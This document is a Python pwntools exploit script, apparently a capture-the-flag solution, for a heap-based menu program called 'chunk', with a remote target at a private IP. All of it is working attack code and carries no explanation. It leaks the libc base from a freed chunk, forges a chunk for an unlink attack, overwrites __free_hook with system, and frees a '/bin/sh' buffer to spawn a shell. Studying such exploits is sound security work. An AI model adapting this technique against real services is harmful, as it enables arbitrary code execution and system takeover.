#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./chunk')
if local:
    p = process('./chunk')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(idx,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(idx))
    ru("how long: ")
    sl(str(size))
def show(idx):
    ru("Your choice: ")
    sl('2')
    ru("Which book do you want to show?")
    sl(str(idx))
def free(idx):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(idx))
def edit(idx,size,py):
    ru("Your choice: ")
    sl('4')
    ru("Which book to write?")
    sl(str(idx))
    ru("how big?")
    sl(str(size))
    ru("Content: ")
    sd(py)

add(0,0x108)
add(1,0x108)
edit(1,8,'/bin/sh\x00')
add(2,0x108)
free(0)
debug(0)
show(0)
ru("Content: ")
libc_base = u64(rc(6).ljust(8,'\x00'))-0x3c4b78
print "libc_base--->" + hex(libc_base)
system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()
onegadget = libc_base + 0xf1207
malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
fake_chunk = malloc_hook - 0x23
free_hook = libc_base + libc.sym["__free_hook"]
ptr = 0x602298
fd = ptr-0x18
bk = ptr-0x10
add(3,0x100)
add(4,0x100)
add(5,0x100)
py = ''
py += p64(0) + p64(0x101)
py += p64(fd) + p64(bk)
py += p64(0)*28
py += p64(0x100) + p64(0x110)
py += p64(0)
edit(3,0x120,py+'\n')
free(1)
edit(3,0x8,p64(free_hook))
edit(0,8,p64(system))
add(10,0x68)
edit(10,8,'/bin/sh\x00')
# debug(0x000000000400B94,0)
free(10)
p.interactive()